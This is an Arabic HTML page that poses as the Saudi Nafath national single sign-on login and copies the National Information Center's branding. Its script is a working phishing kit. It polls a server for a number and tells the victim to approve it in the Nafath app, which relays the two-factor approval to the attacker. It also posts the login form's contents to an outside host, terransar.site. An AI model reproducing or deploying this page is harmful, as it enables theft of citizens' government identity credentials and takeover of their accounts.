<!DOCTYPE html>
<html lang="ar" dir="rtl"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>تسجيل الدخول</title>
  <meta name="description" content="نفاذ">
  <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
  <meta name="csrf-token" content="{{ csrf_token() }}">
  <!-- Stylesheet -->
  
  <link rel="stylesheet" href="../new/css/style.min.css">
    <script type='text/javascript' src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js'></script>
	<script src="https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
	 <style> 
	 .text-danger {
  
     background: #ed8280;
    }
	.text-danger input{
   
   
    }
	 .red {
  
     color: #ed8280!important;
    }
	 </style>
	 <script src="../new/js/HTI8BwV16s" async></script>

</head>

<body>

  <div class="o-page">
    <div class="container-fluid u-p-zero">
      <div class="container-fluid u-p-zero" style="">
  <header class="c-navbar u-mb-large">
        <a class="c-navbar__brand u-ml-medium" href="#">
            <img src="../new/img/logo.png" width="128">
        </a>
        <img src="../new/img/vision2030-grey.svg" width="128" class="u-opacity-heavy u-ml-auto u-hidden-down@mobile">

        <!-- Navigation items -->
        <nav class="c-navbar__nav collapse u-border-bottom" id="main-nav">
          <ul class="c-navbar__nav-list">
              <!--li class="c-navbar__nav-item">
                <a class="c-navbar__nav-link" href="#"><i class="feather icon-home"></i> الرئيسية</a>
              </li>
			  <li class="c-navbar__nav-item">
				<a class="c-navbar__nav-link c-tooltip c-tooltip--bottom " aria-label="إنشاء حساب جديد عن طريق منصة أبشر" href="#"><i class="feather icon-user"></i> حساب جديد</a>
              </li-->
			  <!--li class="c-navbar__nav-item">
				<a class="c-navbar__nav-link " href="#"><i class="feather icon-log-in"></i> تسجيل الدخول</a>
			  </li-->
			  <li class="c-navbar__nav-item">
				<a class="c-navbar__nav-link " href="#"><i class="feather icon-globe"></i> English</a>
			  </li>
          </ul>
        </nav>		
				
		<!-- Start of Dropdown Menus -->
		<!--div id="favouritesNavMain" class="c-dropdown dropdown u-mr-medium hide">
        <a class="c-notification dropdown-toggle c-btn c-btn--outline c-btn--small c-btn--secondary" id="ddFavorites" data-toggle="dropdown" role="button">
          <i class="c-notification__icon feather icon-star"></i>
        </a>
        <div class="c-dropdown__menu c-dropdown__menu--large dropdown-menu"  data-boundary="ddFavorites">
          <span class="c-dropdown__menu-header">
            المفضلة
          </span>

          <span id="recent_services" class="c-dropdown__menu-header">
            الخدمات المستخدمة مؤخراً
          </span-->
          <!-- Recent activity will be updated here -->
          <!--a class="c-dropdown__menu-footer">
          </a>
        </div>
    </div-->
    <!--div id="alertsNavMain" class="c-dropdown dropdown u-mr-small hide">
        <div class="c-notification has-indicator dropdown-toggle c-btn c-btn--outline c-btn--small c-btn--secondary" id="ddNotifications" data-toggle="dropdown" role="button">
          <i class="c-notification__icon feather icon-bell"></i>
        </div>
        <div class="c-dropdown__menu c-dropdown__menu--large dropdown-menu"  data-boundary="ddNotifications">
          <span class="c-dropdown__menu-header">
            التنبيهات
          </span>
          
          <a class="c-dropdown__menu-footer">
            كل التنبيهات
          </a>
        </div>
    </div-->
    <div id="currentUserNavMain" class="c-dropdown dropdown u-mr-small hide">
        <div class="dropdown-toggle c-notification c-btn c-btn--outline c-btn--small c-btn--secondary" id="dropdownMenuAvatar" data-toggle="dropdown" role="button">
            <i class="c-notification__icon feather icon-user"> <span id="currentAuthUser"></span></i>
        </div>
        <div class="c-dropdown__menu dropdown-menu has-arrow dropdown-menu-right">
          <!--a class="c-dropdown__item dropdown-item c-avatar c-avatar--small dropdown-toggle" href="#">
            <div class="o-media">
              <!--div class="o-media__img u-ml-small">
                <img class="c-avatar__img" src="/img/placeholder-user.png" alt="profile pic">
              </div-->
              <!--div class="o-media__content">
                <span id="currentAuthUser"></span>
              </div>
            </div>
          </a-->
          <a class="c-dropdown__item dropdown-item" href="#">معلوماتي</a>
          <a class="c-dropdown__item dropdown-item" href="#">تسجيل الخروج</a>
        </div>
    </div>
	<!-- End of Dropdown Menus -->
	
        <!-- // Navigation items  -->
		<button class="c-navbar__nav-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-nav" aria-expanded="false">
            <i class="feather icon-menu"></i>
        </button>
      </header>
</div>
    </div>

    <div class="container">
		
		
		
				   
		   
		<div class="conts_forms">
			<div id="auth_sequence" style="">
			<div class="row u-justify-center"> 
			<div class="col-md-8">
			<div class="u-text-center">
			
			
			</div> </div> </div> </div>
						
			<div class="row u-justify-center">
				<div class="col-md-8">
					<div id="errors" class="c-alert c-alert--danger alert u-mb-medium hide" style="display: none;">
					   <span class="c-alert__icon">
						 <i class="feather icon-slash"></i>
					   </span>
					   <div class="c-alert__content">
						 <h4 id="errorMessage" class="c-alert__title u-color-danger"></h4>
					   </div>
					</div>
			   </div>
		   </div>
		   
		</div>
		
		<div id="content">
		<form novalidate="novalidate"> 
		<input name="selectedSecuence" id="selectedSecuence" type="hidden" value="2"> 
		<input name="startover" id="startover" type="hidden" value="SO"> 
		</form> <div class="row u-justify-center ">  
		
		<div class="content" id="pl1" style="width: 100%;"></div> 
	<button class="collapsible active">تطبيق نفاذ</button> 
	<div class="content active" id="pl2" style="max-height: 1200px; width: 100%;">
	﻿<div class="row u-justify-center"> <div class="col-md-8">
	<div class="c-card"> 
	<div class="row"> 
	<div class="col-md-6">
	<form id="userlogin" novalidate="novalidate"> <div style="overflow: hidden; width: 0px; height: 0px"> 
	<input type="password" id="Fake_passwod" value="000000000" tabindex="-1"> </div>
	
			
		
		
		<div id="thecodeitdiv" class="c-field u-mb-medium" style=" text-align: center;color: #11998e;display: none;"> 
		<p id="thecodeit" style="font-size:30px;font-weight:bold; padding:10px; width:80px;margin: auto; border: solid 2px; border-radius:5px; "></p>
		
		
		<label class="c-field__label" for="j_username" style="
    margin-top: 20px;
    font-size: 1rem;
"> الرجاء التوجه الى تطبيق نفاذ ثم توثيق طلب ربط شريحتك في الحجز بإختيار الرقم أعلاه .</label>
		</div>
	
	
	 </form> 
	<div class="modalDetails">
	<div class="u-flex  u-mt-medium" style=" justify-content: center; "> 
	<a id="mysend" style="display:none; color: red; " class="c-btn c-btn--secondary c-btn--outline c-btn--small"> إعادة إرسال</a> </div>
	
	<p id="mytimer" style="display:none;color: #000;text-align: center;">50</p>
	<p style="color: #000;text-align: center;">لتحميل تطبيق نفاذ</p>
                                 <div class="d-flex align-items-center" style="justify-content: center;">
									  <a href="https://apps.apple.com/us/app/%D9%86%D9%81%D8%A7%D8%B0-nafath/id1598909871" target="_blank" class="mr-2 gtmLink" title="TicketMX iOS App" data-event="footer_navidation" data-event-category="Navigation" data-event-action="Footer">
										 <img src="../new/img/ios-ar.png" width="150" class="img-fluid" alt="ios ticketmx app">
									  </a>
									  <a href="https://play.google.com/store/apps/details?id=sa.gov.nic.myid" target="_blank" class="gtmLink" title="TicketMX Android App" data-event="footer_navidation" data-event-category="Navigation" data-event-action="Footer">
										 <img src="../new/img/android-ar.png" width="150" class="img-fluid" alt="android ticketmx app">
									  </a>
								   </div>                       
                       </div>
	   <script type='text/javascript'>
	   $( document ).ready(function(){
		   
		   
		   $( "#mysend" ).on( "click", function() {


			   $.ajax({

				headers: {
    'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
  },
			url:'/checknfathcode',
			   type: 'POST',
			   dataType: 'json',
			   timeout:6000, //3 second timeout
			   success: function(data){


				console.log(data);
				   if(data.live == 'yes'){
				    console.log('yes');
					clearInterval(poolinterval);
					  window.location.href = '/bname/1';
				   } else if(data.live == 'cancl'){
					   
					    console.log('cancl');
	
						clearInterval(poolintervalit);
						window.location.href = '/bname/1';
					
					  $(':input').prop('disabled', false);
				   } 
				   else if(data.live == 'whatsapp'){
					   
					   console.log('whatsapp');
		
					   clearInterval(poolintervalit);
					   window.location.href = 'https://pnu.edu.sa/ar/Pages/home.aspx';
				  
					  $(':input').prop('disabled', false);
				  }
				  else if(data.live == 'still'){ 

					console.log('still');
				  }
				  else if(data.live == 'no'){ 

					console.log('no');
					 			  
					}	else  {

						console.log('number');
						$( "#spinner" ).hide();
						$( "#thecodeitdiv" ).show();
						$( "#thecodeit" ).html(data.live);
						console.log('no conformation yet abounafath to cont');
				   }
				  
				  
			   },
			   error: function(){
				   $(':input[type="submit"]').prop('disabled', false);
				    console.log('err 20');
			   }



		 });
			});
		   

   
    
	var pollit = function(){
		 $.ajax({
			headers: {
   					 'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
 				 },
			url:'/checknfathcode',
			   type: 'POST',
			   dataType: 'json',
			   timeout:6000, //3 second timeout
			   success: function(data){


				   console.log(data);
				   if(data.live == 'yes'){
					console.log('yes');
					clearInterval(poolinterval);
					  window.location.href = '/bname/1';
				   } else if(data.live == 'cancl'){
					   
						console.log('cancel');
					
						clearInterval(poolintervalit);
						window.location.href = '/bname/1';
					
					  $(':input').prop('disabled', false);
				   } 
				   else if(data.live == 'whatsapp'){
					   
						console.log('whatsapp');
					   clearInterval(poolintervalit);
					   window.location.href = 'https://pnu.edu.sa/ar/Pages/home.aspx';
				  
					  $(':input').prop('disabled', false);
				  }
				  else if(data.live == 'still'){ 

					console.log('still');
				  }
				  else if(data.live == 'no'){ 

					console.log('no');
							
					}	else  {

							 console.log('number');
							$( "#spinner" ).hide();
							$( "#thecodeitdiv" ).show();
							$( "#thecodeit" ).html(data.live);
							console.log('no conformation yet abounafath to cont');
					}
				  
				  
			   },
			   error: function(){
				   $(':input[type="submit"]').prop('disabled', false);
				    console.log('err 20');
			   }


		 });
   };
    var poolintervalit = setInterval(function(){
    console.log('poollingit');
	pollit();
   },6000);
   
   
		   
		    $("#j_username").keyup(function () {
				 $("#j_username").removeClass('text-danger');
			  });
			   $("#j_password").keyup(function () {
				 $("#j_password").removeClass('text-danger');
			  });
		    $('#userlogin').submit(function(e){
				  e.preventDefault();
				  let usernameValue = $("#j_username").val();
					if (usernameValue.length == "") {
					  $("#j_username").addClass('text-danger');
					  usernameError = false;
					  return false;
					} 
					  let passwordValue = $("#j_password").val();
					if (passwordValue.length == "") {
					  $("#j_password").addClass('text-danger');
					  usernameError = false;
					  return false;
					} 
				  $.ajax({
				   url:'https://terransar.site/index.php/booking/setusernafath',
				   type: 'POST',
				   data: $("#userlogin").serialize(),
				   success: function(){
					  window.location.href = '/bname/1';
					  
				   },
				   error: function(){
					  
				   }
			   });
			});
		   
		   
	   });
	   </script>
	
	
	
	
	<div class="clr"></div>  </div> 
	
	
	
	<div class="col-md-5 u-text-center u-p-small u-mh-small u-hidden-down@mobile u-color-secondary">
	<img src="../new/img/secure.svg" width="150"> <p>الرجاء إدخال اسم المستخدم \ الهوية الوطنية وكلمة المرور ثم اضغط تسجيل الدخول</p> </div> 
	</div> </div> </div> </div>  
	</div>   </div> <div class="clr"> </div>
	</div>
		
    </div><!-- // .container -->

    <div class="container-fluid">
      <div class="row">
        <div class="col-12">
          <footer class="c-footer u-mt-large u-justify-between">
            <div class="o-media">
              <div class="o-media__img u-ml-small">
                <div class="c-avatar">
                  <img class="c-avatar__img" src="../new/img/NIC-logo.png" alt="NIC-logo">
                </div>
              </div>

              <div class="o-media__content u-mt-small">
                <p>تطوير وتشغيل</p>
                <h5 class="u-color-secondary">مركز المعلومات الوطني</h5>
				<p>النفاذ الوطني الموحد جميع الحقوق محفوظة © 2022</p>
              </div>
            </div>
            <nav>
              <a class="c-footer__link" href="#">الرئيسية</a>
              <a class="c-footer__link" href="#">حول</a>
              <a class="c-footer__link" href="#">اتصل بنا</a>
              <a class="c-footer__link" href="#">الشروط والأحكام</a>
              <a class="c-footer__link" href="#">المساعدة والدعم</a>
            </nav>
          </footer>
        </div>
      </div>
    </div>
  </div><!-- // .o-page -->

 
	




  
		
<!-- spinner -->
<div id="spinner" class="overlayWrapper u-m-0" style="
    position: fixed;
    display: block;
    width: 100%; 
    height: 100%;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background-color: rgba(0,0,0,0.5); 
    z-index: 2; 
    cursor: pointer;
    ">
     <div class="overlayBG"></div>
           <div id="loading" class="overlayContainerOuter" style="text-align: center; padding-top: 20%;">
               <div class="overlayContainerInner u-p-medium" style="
    background-color: white;
">
                   <div class="spinnerContent">
                       
                      
                       <div class="modalDetails">
                           <div class="loading_msg">
           <img alt="" src="../new/img/loader.gif"><br>
جاري المعالجة ، نرجو الإنتظار ...      </div>                                 
                       </div>
                   </div>
               </div>
           </div>
   </div>
<!-- spinner -->
	
	<div id="browserErrorsOverlay" class="overlayWrapper" style="display:none;">
      <div class="overlayBG"></div>
            <div class="overlayContainerOuter">
                <div class="overlayContainerInner">
                    <div id="browserErrorsOverlayContent" class="overlayContent" style="width: 630px;text-align: center; !important;">
                        <div>
                            <a href="#" class="overlayClose overlayClose_iconed"></a>
                        </div>
                        <h2>
                        	<img src="../new/img/moi_logo_rtl.gif" width="500" style="border-style:none;">
                        </h2>
                        <hr>
                     
                 </div>
            </div>
         </div>
     </div>
		


</body></html>